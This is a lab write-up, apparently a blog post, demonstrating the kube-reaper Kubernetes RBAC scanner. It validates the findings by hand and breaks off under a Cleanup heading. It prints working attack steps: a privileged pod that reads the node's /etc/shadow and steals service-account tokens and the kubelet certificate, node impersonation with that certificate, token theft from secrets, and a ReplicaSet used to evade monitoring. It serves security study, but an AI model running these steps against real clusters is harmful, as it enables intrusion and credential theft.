---
title: "From Developer Pod to Cluster Admin using Kube-Reaper"
kicker: "Kubernetes . RBAC Attack Paths . Privilege Escalation"
tags: "Kubernetes . kube-reaper . RBAC . Pentesting"
lead: "Using kube-reaper to map RBAC attack paths in a Kubernetes cluster, then manually validating every finding: privileged pod breakout, credential theft, identity pivoting, and unconventional permission abuse."
---

## The Lab

![Lab Topology](image/kube-reaper-lab-topology.svg)

*Lab cluster designed by [SpecterOps](https://specterops.io/), adapted to run in a Proxmox environment.*

The cluster runs Kubernetes v1.35.1 on Ubuntu 24.04 with Calico CNI. Three nodes, one control plane and two workers. Our initial foothold is a Mythic C2 callback on worker-2 running as the `developer` SA. From there, we port-forwarded into the `code-server` pod in the `development` namespace, which has the RBAC permissions we will be exploring.

**Nodes:**

| Node | IP | Role |
|------|----|------|
| k8s-control-plane-1 | 10.3.10.20 | Control plane (apiserver, etcd, scheduler, controller-manager) |
| k8s-worker-1 | 10.3.10.30 | Worker |
| k8s-worker-2 | 10.3.10.31 | Worker (hosts our foothold) |

**Namespaces with custom workloads:**

| Namespace | Workloads | PSS Enforcement |
|-----------|-----------|-----------------|
| development | code-server (foothold), developer SA | baseline |
| cicd | empty (but we can deploy here) | **none** |
| production | prod-backend | **none** |

**Key identities:**

| Identity | Type | Permissions |
|----------|------|-------------|
| code-server | ServiceAccount (development) | Pods, services, configmaps, deployments in development + cicd |
| developer | ServiceAccount (development) | Port-forward only. Has a non-expiring token secret |
| prod-debug-agent | User | List secrets cluster-wide. Create rolebindings in production |
| kubernetes-admin | User | Full cluster-admin |

---

## What is [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) is a Kubernetes RBAC attack path scanner. You give it a token or kubeconfig file. It tells you what you can break.

Most RBAC audit tools list permissions and flag things that look wrong. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) does something different. It chains permissions together into attack paths. It tells you: "You can create pods in this namespace, that namespace has no Pod Security Standards, so you can deploy a privileged container and break out to the node."

It is a single Rust binary. You can drop it on a compromised pod, a worker node, or run it from your attack machine. It needs only a token and an API server address.

### Reading Kubernetes Identity Strings

Throughout this post, you will see identities written like `system:serviceaccount:development:code-server`. This is the standard Kubernetes format for service account identities. Here is how it breaks down:

```
system:serviceaccount:development:code-server
│                     │           │
│                     │           └─ ServiceAccount name
│                     └─ Namespace
└─ Identity type (serviceaccount, node, etc.)
```

So `system:serviceaccount:kube-system:bootstrap-signer` means: a ServiceAccount named `bootstrap-signer` in the `kube-system` namespace. User identities follow a simpler format like `kubernetes-admin` or `prod-debug-agent` with no namespace prefix.

---

## Scan 1: Foothold Reconnaissance

Our initial access to the cluster came through a Mythic C2 callback running as the `developer` service account. That SA has `pods/portforward` permissions, which we used to port-forward into the `code-server` pod and access its VS Code web interface. From there, we are operating as the `code-server` service account, which has a much broader set of RBAC permissions. This is where [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) picks up. First, we grab the projected service account token and store it in a variable:

```bash
[code-server pod] $ export CS_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

We point [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) at the API server with this token:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --output terminal
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) runs through its scan phases. It checks our identity, lists namespaces, maps our permissions across each one, finds pods we can see, checks for accessible secrets, and then matches everything against its pattern library.

```
[*] Identifying current identity...
[+] Identity: system:serviceaccount:development:code-server
[*] Enumerating namespaces...
[+] Found 10 namespaces
[*] Enumerating RBAC permissions across 10 namespaces...
[+] Enumerated permissions in 10 namespaces
[*] Enumerating pods...
[+] Found 2 pods
[*] Checking secret accessibility...
[+] 0 secrets accessible
[*] Enumerating RBAC graph (roles, bindings, identities)...
[+] RBAC graph: 0 roles, 0 bindings, 0 identities (0 SAs, 0 users, 0 groups)
```

The scan summary gives us the full picture in seconds:

```
═══════════════════════════════════════════════════════
  Identity: system:serviceaccount:development:code-server
  Namespace: default
  Namespaces Found: 10
  Findings: 13
  Attack Chains: 1
  Dangerous Pods: 1
═══════════════════════════════════════════════════════
```

13 findings. 1 attack chain. 1 dangerous pod. Let us look at each section.

### Attack Chain: Privileged Pod Breakout

The first thing [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) shows is attack chains. These are multi-step paths from your current permissions to a higher level of access.

```
Chain #1 [CRITICAL] Privileged Pod Breakout via
         system:serviceaccount:development:code-server in cicd
────────────────────────────────────────────────────────────

  system:serviceaccount:development:code-server can create pods in
  namespace cicd which has no PSS enforcement. Deploy a privileged
  pod to break out to the node.

  ├──▶ [code-server@cicd] Create privileged pod with hostPID,
  │     hostNetwork, hostPath:/
  │   → Pod deployed with full node access (Code Execution)
  └──▶ [code-server@cicd] chroot /mnt from inside privileged container
      → Root shell on worker node (Node Breakout)

  Final Capability: Node Breakout
```

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found that:
1. Our SA can **create pods** in the `cicd` namespace
2. The `cicd` namespace has **no Pod Security Standards** enforcement
3. This means we can deploy a pod with `privileged: true`, `hostPID`, `hostNetwork`, and `hostPath: /`
4. From inside that pod, we `chroot /mnt` and we are root on the node

### Dangerous Pod Detection

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) also found a pod already running in the cluster that is configured dangerously:

```
● [CRITICAL] cicd/breakout
  │ SA: default | Image: python:3-slim | Node: k8s-worker-2
  ├ ⚠ PRIVILEGED container
  ├ ⚠ hostPID enabled
  ├ ⚠ hostNetwork enabled
  ├ ⚠ hostPath mount: / (ROOT/SENSITIVE)
  └ ⚠ SA token auto-mounted (SA: default)
  Attack: exec into privileged container -> full node access
```

I had already deployed a privileged pod in cicd with the host root filesystem mounted. This pod has everything an attacker needs: privileged security context, access to the host PID namespace, host networking, and the entire host filesystem at `/`.

### Namespace Security Map

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) maps Pod Security Standards enforcement across all namespaces and cross-references it with our ability to create pods:

```
● cicd        | NO PSS ENFORCEMENT | can create pods <- PRIVILEGED POD BREAKOUT PATH
● default     | NO PSS ENFORCEMENT | cannot create pods
● development | PSS: baseline      | can create pods
● production  | NO PSS ENFORCEMENT | cannot create pods
● kube-system | NO PSS ENFORCEMENT | cannot create pods
```

The `cicd` namespace is the weak link. No PSS enforcement **and** we can create pods there. The `development` namespace has `baseline` PSS, which blocks privileged containers.

### Dangerous Permission Patterns

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) has a library of 55 dangerous RBAC permission patterns. It matches our permissions against every pattern and reports what we can do:

**CRITICAL:**
- Create Pods (No PSS Enforcement) in cicd. This enables node breakout.

**HIGH:**
- Create Pods with ServiceAccount specification in cicd and development. We can create a pod that runs as any SA in the namespace.
- Patch/Update Pods in cicd and development. We can modify running pods to inject privileged containers.
- Create Deployments in cicd and development. Persistent access through controller-managed workloads.

**MEDIUM (Unconventional):**
- Create ReplicaSets directly. This lets us deploy pods without the deployment audit trail. Most defenders monitor deployment creation, not direct ReplicaSet creation.

### Manual Validation: The Privileged Pod Breakout

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) told us we can break out through cicd. Let us prove it, end-to-end, using only the code-server SA identity.

#### Step 1: Confirm permissions

All commands in this validation run from inside the code-server pod on worker-2. We use `/tmp/kubectl` (downloaded earlier) and `/tmp/cs-kubeconfig` (a clean kubeconfig with only the code-server SA token, no admin client certificates).

First, we verify that the code-server SA can create pods in the cicd namespace:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig auth can-i create pods -n cicd
yes
```

And confirm we **cannot exec** into pods there:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig auth can-i create pods --subresource=exec -n cicd
no
```

And that cicd has no PSS:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig get namespace cicd --show-labels | grep pod-security
```

No output. No `pod-security.kubernetes.io/enforce` label. The namespace accepts any pod spec.

We can create pods but cannot exec into them. This means we cannot use `kubectl exec` to interact with the pod after it starts. We need to embed our commands directly in the container startup command. In a real engagement you would use a reverse shell or C2 callback. For this validation, the pod collects proof data on startup and serves it over HTTP using `hostNetwork`.

#### Step 2: Deploy the self-extracting breakout pod

We create a pod with every host-level access flag enabled. The container command does the node breakout automatically: it runs `chroot` to get root on the host, reads `/etc/shadow`, lists the kubelet PKI certificates, finds all projected SA tokens on the node, copies the kubelet client certificate and cluster CA to `/tmp`, and then starts a Python HTTP server to serve everything.

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: reaper-breakout
  namespace: cicd
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: python:3-slim
    command: ["sh", "-c", "chroot /mnt id > /tmp/proof.txt && chroot /mnt hostname >> /tmp/proof.txt && head -3 /mnt/etc/shadow >> /tmp/proof.txt && ls /mnt/var/lib/kubelet/pki/ >> /tmp/proof.txt && find /mnt/var/lib/kubelet/pods -name token -path '*kube-api-access*' >> /tmp/proof.txt 2>/dev/null && cat /mnt/var/lib/kubelet/pki/kubelet-client-2026-09-13-14-51-33.pem > /tmp/kubelet-client.pem && cp /mnt/etc/kubernetes/pki/ca.crt /tmp/kubelet-ca.pem 2>/dev/null && cd /tmp && python3 -m http.server 8888"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostfs
      mountPath: /mnt
  volumes:
  - name: hostfs
    hostPath:
      path: /
      type: Directory
EOF
```

```
pod/reaper-breakout created
```

The API server accepted it. No admission controller blocked it. The pod starts on worker-2:

```
NAME              READY   STATUS    RESTARTS   AGE   IP           NODE
reaper-breakout   1/1     Running   0          17s   10.3.10.31   k8s-worker-2
```

#### Step 3: Read the proof without exec

The pod uses `hostNetwork`, so it shares the node's IP address. The Python HTTP server listens on port 8888 at `10.3.10.31`. We retrieve the proof file with a simple curl, no exec needed:

```bash
[code-server pod] $ curl -s http://10.3.10.31:8888/proof.txt
```

```
uid=0(root) gid=0(root) groups=0(root)
k8s-worker-2
root:*:20135:0:99999:7:::
daemon:*:20135:0:99999:7:::
bin:*:20135:0:99999:7:::
kubelet-client-2026-09-13-14-51-33.pem
kubelet-client-current.pem
kubelet.crt
kubelet.key
/mnt/var/lib/kubelet/pods/.../kube-api-access-pvzhg/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-dq7ss/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-n96zv/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-94rtc/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-4s8jt/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-28jmq/token
/mnt/var/lib/kubelet/pods/.../kube-api-access-l24wn/token
```

Line by line, this tells us:
- **`uid=0(root)`**: The container runs as root with full capabilities (privileged mode)
- **`k8s-worker-2`**: `chroot /mnt hostname` resolved the host's hostname, not the container's. We broke out of the container
- **`/etc/shadow`**: We read the node's shadow file. Full host filesystem access is confirmed
- **`kubelet-client-*.pem`**: The kubelet's client certificates are accessible. These authenticate as `system:node:k8s-worker-2` to the API server. A kubelet client identity represents an entire infrastructure node, while a service account represents a specific software workload running inside the cluster
- **7 SA token paths**: Every service account token projected into pods on this node is readable

The code-server SA created a pod. The pod broke out of the container. We read the proof over the network. No `kubectl exec` was used at any point.

#### Step 4: Steal identities from the node

From the node filesystem, each projected token under `/var/lib/kubelet/pods/` belongs to a pod running on worker-2. In a real engagement, the breakout pod's startup command would exfiltrate these tokens (via the HTTP server, a reverse shell, or a DNS callback). Here we show what those tokens resolve to:

| Stolen Token | Identity |
|-------------|----------|
| Token 1 | system:serviceaccount:development:code-server |
| Token 2 | system:serviceaccount:calico-system:calico-node |
| Token 3 | system:serviceaccount:calico-apiserver:calico-apiserver |
| Token 4 | system:serviceaccount:cicd:default |
| Token 5 | system:serviceaccount:production:default |
| Token 6 | system:serviceaccount:calico-system:default |
| Token 7 | system:serviceaccount:kube-system:kube-proxy |

Seven identities, each with different permissions across the cluster.

#### Step 5: Pivot to the node identity

The breakout pod also exfiltrated the kubelet client certificate from `/var/lib/kubelet/pki/` and the cluster CA. Both files are served on the HTTP server alongside the proof data. From the code-server pod, we download them:

```bash
[code-server pod] $ curl -s http://10.3.10.31:8888/kubelet-client.pem -o /tmp/kubelet-client.pem
[code-server pod] $ curl -s http://10.3.10.31:8888/kubelet-ca.pem -o /tmp/kubelet-ca.pem
```

Now we authenticate to the API server using the stolen kubelet certificate, still from the code-server pod:

```bash
[code-server pod] $ /tmp/kubectl --client-certificate=/tmp/kubelet-client.pem --client-key=/tmp/kubelet-client.pem --certificate-authority=/tmp/kubelet-ca.pem --server=https://10.3.10.20:6443 auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:node:k8s-worker-2
Groups      [system:nodes system:authenticated]
```

We pivoted to `system:node:k8s-worker-2` without ever leaving the code-server pod. The Kubernetes Node Authorization module limits this identity to secrets that belong to pods on this node. But it gives us another angle to enumerate from.

The attack chain is validated end-to-end. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) identified the path. We walked it manually using only the code-server SA's `create pods` permission. Every step ran from the code-server pod. No admin access was used at any point.

### Cleanup

From the code-server pod, delete the breakout pod so we do not leave orphans in the cluster:

```bash
[code-server pod] $ /tmp/kubectl --kubeconfig=/tmp/cs-kubeconfig delete pod reaper-breakout -n cicd
```

```
pod "reaper-breakout" deleted
```

Also remove the exfiltrated credentials from the foothold:

```bash
[code-server pod] $ rm -f /tmp/kubelet-client.pem /tmp/kubelet-ca.pem
```

---

## Scan 2: Full RBAC Graph Enumeration (Admin View)

When you run [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) with cluster-admin privileges, it unlocks the full RBAC graph analysis. This is useful for defenders and for attackers who already have admin access and want to understand the entire attack surface.

We run this scan on the control plane (`k8s-control-plane-1`) as `kubernetes-admin`, using the default admin kubeconfig:

```bash
[k8s-control-plane-1] $ kube-reaper --output terminal --pivot --pivot-depth 3
```

The scan discovers far more:

```
═══════════════════════════════════════════════════════
  Identity: kubernetes-admin
  Namespaces Found: 10
  Findings: 10
  Attack Chains: 29
  Dangerous Pods: 20
  CRD Attack Surface: 2
  Overprivileged Identities: 43
  Pivot Identities: 50 (49 edges, depth 1)
  Accessible Secrets: 9
═══════════════════════════════════════════════════════
```

29 attack chains. 20 dangerous pods. 43 overprivileged identities. 50 pivotable identities. Let us look at the key sections.

### RBAC Identity Graph

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) enumerates all 96 roles, 84 bindings, and maps them to 68 identities (55 service accounts, 5 users, 8 groups). It builds a profile for each identity:

```
● [CRITICAL] prod-debug-agent (User)
  │ Roles: ClusterRole/prod-debug-agent-observer,
  │        Role/production/prod-rolebinding-manager
  │ Namespaces: cluster-wide, production
  └ Dangerous: Read Node Information, Read ConfigMaps,
               Read Secrets, Create/Modify RoleBindings,
               Bind Verb on Roles
```

```
● [CRITICAL] system:serviceaccount:development:code-server (ServiceAccount)
  │ Roles: ClusterRole/code-server-namespace-reader,
  │        Role/cicd/developer-cicd-debug,
  │        Role/development/code-server-role
  │ Namespaces: cluster-wide, cicd, development
  └ Dangerous: Create Pods (No PSS Enforcement),
               Create Pods (With SA Specification),
               Delete Pods, Patch/Update Pods,
               Create/Modify Services + Endpoints (+4 more)
```

```
● [CRITICAL] system:serviceaccount:kube-system:clusterrole-aggregation-controller
  │ Roles: ClusterRole/system:controller:clusterrole-aggregation-controller
  │ Namespaces: cluster-wide
  └ Dangerous: Escalate Verb on ClusterRoles,
               Create/Modify ClusterRoles
```

The `clusterrole-aggregation-controller` finding is interesting. This system controller has the `escalate` verb, which lets it bypass Kubernetes RBAC escalation prevention. If an attacker compromises this SA, they can give any role any permission.

### Secret Triage

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) classifies accessible secrets by risk:

```
● [CRITICAL] development/developer-token (SA Token)
  │ Type: kubernetes.io/service-account-token
  └ Attack: Contains a non-expiring SA token.
            Decode and use: kubectl --token=<token> --server=<api>.
            Pivot to this SA's identity.
```

```
● [MEDIUM] production/prod-debug-certs (Opaque Secret)
  │ Type: Opaque
  └ Attack: Opaque secret. May contain passwords, API keys,
            connection strings.
```

The `developer-token` secret is CRITICAL because it contains a Kubernetes service account token that never expires. Old-style SA token secrets (type `kubernetes.io/service-account-token`) persist until someone deletes them.

### CRD Attack Surface

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) scans Custom Resource Definitions for known attack patterns:

```
● [HIGH] GlobalNetworkPolicy (Service Mesh)
  │ CRD: globalnetworkpolicies.crd.projectcalico.org
  └ Attack: Modify/delete Calico GlobalNetworkPolicy ->
            disable network segmentation cluster-wide

● [MEDIUM] NetworkPolicy (Service Mesh)
  │ CRD: networkpolicies.crd.projectcalico.org
  └ Attack: Modify Calico NetworkPolicy ->
            weaken namespace network isolation
```

If an attacker gains permissions to modify Calico GlobalNetworkPolicies, they can disable all network segmentation in the cluster. Every pod would be able to talk to every other pod.

### Manual Validation: Developer Token Secret

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged `developer-token` as CRITICAL. Let us verify this.

On the control plane as `kubernetes-admin`, we extract the token from the secret:

```bash
[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o jsonpath="{.data.token}" | base64 -d > /tmp/dev-token.txt
```

We cannot just pass `--token=$(cat /tmp/dev-token.txt)` directly. The control plane has the admin kubeconfig loaded by default, and that kubeconfig contains client certificates. When kubectl sees both a client certificate and a `--token` flag, the certificate wins. The token gets ignored and `auth whoami` returns `kubernetes-admin` instead of the developer SA. To avoid this, we build a clean kubeconfig that contains only the stolen token and no client certificates:

```bash
[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config set-credentials devsa --token=$(cat /tmp/dev-token.txt) --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config set-context devsa --cluster=lab --user=devsa --kubeconfig=/tmp/stolen.yaml
[k8s-control-plane-1] $ kubectl config use-context devsa --kubeconfig=/tmp/stolen.yaml
```

Now we use the stolen token kubeconfig to verify the identity:

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/stolen.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:development:developer
Groups      [system:serviceaccounts system:serviceaccounts:development
             system:authenticated]
```

The token works. It authenticates as the `developer` service account. We intentionally authenticated with the actual token here instead of using `kubectl --as=developer` impersonation. Impersonation would only prove what permissions the SA has. Authenticating with the token proves the credential itself is valid and usable from anywhere. This SA only has port-forward permissions, but the token is a persistence mechanism. It does not expire. An attacker can copy this token to their own machine and use it weeks later. Even if the developer SA's pod is deleted, this token keeps working until the secret itself is deleted.

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/stolen.yaml auth can-i --list -n development 2>/dev/null | grep -v selfsubject
```

```
Resources          Non-Resource URLs   Resource Names   Verbs
pods/portforward   []                  []               [create]
pods               []                  []               [list get]
```

The developer SA can list pods and create port-forwards. An attacker who steals this token gets persistent access to forward traffic from internal pods to their machine.

### Manual Validation: prod-debug-agent Permissions

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) flagged `prod-debug-agent` as CRITICAL with a dangerous combination: list secrets cluster-wide plus create rolebindings in production.

We validate these permissions on the control plane using `--as` impersonation (which requires admin access):

#### Can it list secrets?

```bash
[k8s-control-plane-1] $ kubectl get secrets -n development --as=prod-debug-agent
NAME              TYPE                                  DATA   AGE
developer-token   kubernetes.io/service-account-token   3      46h
```

```bash
[k8s-control-plane-1] $ kubectl get secrets -n production --as=prod-debug-agent
NAME               TYPE     DATA   AGE
prod-debug-certs   Opaque   3      46h
```

Yes. It can list secrets in every namespace. It sees secret names and types.

#### Can it read secret data?

```bash
[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o yaml --as=prod-debug-agent
```

```
Error from server (Forbidden): secrets "developer-token" is forbidden:
User "prod-debug-agent" cannot get resource "secrets"
```

No. It can list but not get. It sees what secrets exist but cannot read their contents. This is still useful for reconnaissance because it tells the attacker exactly which secrets to target.

#### Can it create rolebindings?

```bash
[k8s-control-plane-1] $ kubectl auth can-i create rolebindings -n production --as=prod-debug-agent
yes
```

```bash
[k8s-control-plane-1] $ kubectl auth can-i bind roles -n production --as=prod-debug-agent
yes
```

Yes to both. This means `prod-debug-agent` can create a RoleBinding in production that binds an existing Role to any user or service account. If there is a Role in production with secret read permissions, prod-debug-agent can bind it to itself and then read all secrets in production.

---

## Scan 3: Recursive Identity Pivoting

[kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)'s `--pivot` flag does something that no manual enumeration can do efficiently. It reads SA token secrets and mints tokens using the TokenRequest API, then authenticates as each discovered identity, enumerates their permissions, and repeats. It builds a graph of every identity it can reach and what each one can do.

From the code-server pod, pivoting finds nothing because code-server cannot read secrets or create tokens:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --pivot --pivot-depth 3
```

```
[*] Starting recursive identity pivot (max depth 3)...
[*] Current identity cannot read secrets or create tokens. No pivot paths.
```

But from the control plane as `kubernetes-admin`, the pivot graph lights up:

```bash
[k8s-control-plane-1] $ kube-reaper --pivot --pivot-depth 3
```

```
[*] Starting recursive identity pivot (max depth 3)...
  [+] Pivot: kubernetes-admin -> development:developer
      (secret development/developer-token)
  [+] Pivot: kubernetes-admin -> development:code-server
      (TokenRequest in development)
  [+] Pivot: kubernetes-admin -> cicd:default
      (TokenRequest in cicd)
  [+] Pivot: kubernetes-admin -> kube-system:certificate-controller
      (TokenRequest in kube-system)
  [+] Pivot: kubernetes-admin -> kube-system:clusterrole-aggregation-controller
      (TokenRequest in kube-system)
  ...
[!] Pivot cap reached (50 identities). Stopping.
[+] Pivot complete: 50 identities, 49 edges, max depth 1
```

The pivot graph output shows each discovered identity with its severity and permissions:

```
[HIGH] system:serviceaccount:development:developer
    [SecretToken development/developer-token]
  via from: kubernetes-admin
  perms: Create Port Forwards

[CRITICAL] system:serviceaccount:development:code-server
    [TokenRequest development/code-server]
  via from: kubernetes-admin
  perms: Create Pods (No PSS Enforcement),
         Create Pods (With SA Specification),
         Delete Pods, Patch/Update Pods (+4 more)

[CRITICAL] system:serviceaccount:kube-system:certificate-controller
    [TokenRequest kube-system/certificate-controller]
  via from: kubernetes-admin
  perms: Approve Certificate Signing Requests

[HIGH] system:serviceaccount:kube-system:bootstrap-signer
    [TokenRequest kube-system/bootstrap-signer]
  via from: kubernetes-admin
  perms: Read ConfigMaps, Create Events, Read Secrets
  pivot: read secrets [kube-system]
```

Notice the last entry. The `bootstrap-signer` SA can read secrets in `kube-system`. If [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git)'s pivot depth were deeper, it would authenticate as bootstrap-signer, read secrets in kube-system, find more SA tokens, and continue the chain.

The method column tells you how each identity was reached:
- **SecretToken**: An old-style non-expiring SA token was found in a Secret
- **TokenRequest**: [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) used the TokenRequest API to mint a fresh token

This distinction matters. SecretToken pivots work from any identity that can read secrets. TokenRequest pivots require `create` on `serviceaccounts/token`.

### Manual Validation: Recursive Pivot

We validate two pivot methods that [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) found. All commands run on `k8s-control-plane-1` as `kubernetes-admin`.

**SecretToken pivot: developer-token.** We extract the token from the secret and authenticate with it:

```bash
[k8s-control-plane-1] $ kubectl get secret developer-token -n development -o jsonpath="{.data.token}" | base64 -d > /tmp/pivot-dev-token.txt
```

Build a clean kubeconfig with the stolen token (no client certificates):

```bash
[k8s-control-plane-1] $ kubectl config set-cluster lab --server=https://10.3.10.20:6443 --insecure-skip-tls-verify --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config set-credentials pivotdev --token=$(cat /tmp/pivot-dev-token.txt) --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config set-context pivotdev --cluster=lab --user=pivotdev --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config use-context pivotdev --kubeconfig=/tmp/pivot-val.yaml
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:development:developer
UID         28333d99-9b8e-4dff-b14f-f3b94dda9378
Groups      [system:serviceaccounts system:serviceaccounts:development
             system:authenticated]
```

Confirmed. The secret contains a valid non-expiring token. We pivoted to `developer`.

**TokenRequest pivot: code-server.** We use the TokenRequest API to mint a short-lived token:

```bash
[k8s-control-plane-1] $ kubectl create token code-server -n development --duration=600s > /tmp/pivot-cs-token.txt
```

```bash
[k8s-control-plane-1] $ kubectl config set-credentials pivotcs --token=$(cat /tmp/pivot-cs-token.txt) --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config set-context pivotcs --cluster=lab --user=pivotcs --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config use-context pivotcs --kubeconfig=/tmp/pivot-val.yaml
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth whoami
```

```
ATTRIBUTE   VALUE
Username    system:serviceaccount:development:code-server
UID         b5ffa344-50cc-4cfe-9089-7f77ac95d89c
Groups      [system:serviceaccounts system:serviceaccounts:development
             system:authenticated]
```

Confirmed. We minted a token and pivoted to `code-server`. This identity has `create pods` in cicd with no PSS enforcement, so the pivot gives us the full breakout chain from Scan 1.

**Bootstrap-signer further pivot.** We verify bootstrap-signer can read secrets in kube-system, which would let the pivot chain continue deeper:

```bash
[k8s-control-plane-1] $ kubectl create token bootstrap-signer -n kube-system --duration=600s > /tmp/pivot-bs-token.txt
[k8s-control-plane-1] $ kubectl config set-credentials pivotbs --token=$(cat /tmp/pivot-bs-token.txt) --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config set-context pivotbs --cluster=lab --user=pivotbs --kubeconfig=/tmp/pivot-val.yaml
[k8s-control-plane-1] $ kubectl config use-context pivotbs --kubeconfig=/tmp/pivot-val.yaml
```

```bash
[k8s-control-plane-1] $ kubectl --kubeconfig=/tmp/pivot-val.yaml auth can-i --list -n kube-system 2>/dev/null | grep secrets
```

```
secrets   []   []   [get list watch]
```

Confirmed. The bootstrap-signer SA can `get`, `list`, and `watch` secrets in kube-system. If there were SA token secrets in kube-system, this identity could read them and pivot further. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) correctly flagged this as a further pivot capability.

### Cleanup

```bash
[k8s-control-plane-1] $ rm -f /tmp/pivot-dev-token.txt /tmp/pivot-cs-token.txt /tmp/pivot-bs-token.txt /tmp/pivot-val.yaml
```

---

## Scan 4: Unconventional RBAC Patterns

Most RBAC scanners flag `create pods` and `get secrets`. [kube-reaper](https://github.com/stillbigjosh/kube-reaper.git) also catches the patterns that defenders rarely monitor.

We run this from the code-server pod using the foothold token:

```bash
[code-server pod] $ kube-reaper --token $CS_TOKEN --server https://10.3.10.20:6443 --unconventional-only
```

```
● Create ReplicaSets (code-server@cicd) [UNCONVENTIONAL]
  │ Resource: replicasets [get, list, watch, create, delete, patch]
  │ Attack: Create a ReplicaSet directly -> deploy pods without
  │         deployment audit trail.
  └ Enables: Code Execution

● Create ReplicaSets (code-server@development) [UNCONVENTIONAL]
  │ Resource: replicasets [get, list, watch, create, delete, patch]
  │ Attack: Create a ReplicaSet directly -> deploy pods without
  │         deployment audit trail.
  └ Enables: Code Execution
```

Why does this matter? Most Kubernetes monitoring tools watch for `Deployment` creation events. Security teams build alerts around deployment creation in sensitive namespaces. But a ReplicaSet can create pods the same way a Deployment does. If you create a ReplicaSet directly, you skip the Deployment controller. The pod still runs. But many audit pipelines miss it.

The admin scan found additional unconventional patterns across the cluster:
- **Escalate verb** on ClusterRoles (clusterrole-aggregation-controller): bypasses RBAC escalation prevention
- **Bind verb** on Roles (prod-debug-agent in production): allows binding existing roles to arbitrary subjects
- **Modify ValidatingAdmissionPolicies** (generic-garbage-collector): could disable admission controls

### Manual Validation: Direct ReplicaSet Creation

We prove that code-server can deploy pods through a ReplicaSet without a Deployment. All commands run on `k8s-control-plane-1` using `--as` impersonation.

First, confirm the permission:

```bash
[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server auth can-i create replicasets -n cicd
yes
```

Create a ReplicaSet directly:

```bash
[k8s-control-plane-1] $ kubectl --as=system:serviceaccount:development:code-server apply -f - <<EOF
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: stealth-rs
  namespace: cicd
spec:
  replicas: 1
  selector:
    matchLabels:
      app: stealth
  template:
    metadata:
      labels:
        app: stealth
    spec:
      containers:
      - name: beacon
        image: busybox
        command: ["sleep", "3600"]
EOF
```

```
replicaset.apps/stealth-rs created
```

The pod starts:

```bash
[k8s-control-plane-1] $ kubectl get pods -n cicd -l app=stealth --as=system:serviceaccount:development:code-server
```

```
NAME               READY   STATUS    RESTARTS   AGE
stealth-rs-jnrzm   0/1     ContainerCreating   0      7s
```

But there is no Deployment:

```bash
[k8s-control-plane-1] $ kubectl get deployments -n cicd --as=system:serviceaccount:development:code-server
No resources found in cicd namespace.
```

The pod runs. No Deployment exists. Most audit tools and SIEM rules watch for Deployment creation events. A direct ReplicaSet bypasses that detection layer completely. The pod still gets a service account token, can mount volumes, and runs with whatever security context the namespace allows.

### Cleanup

```bash
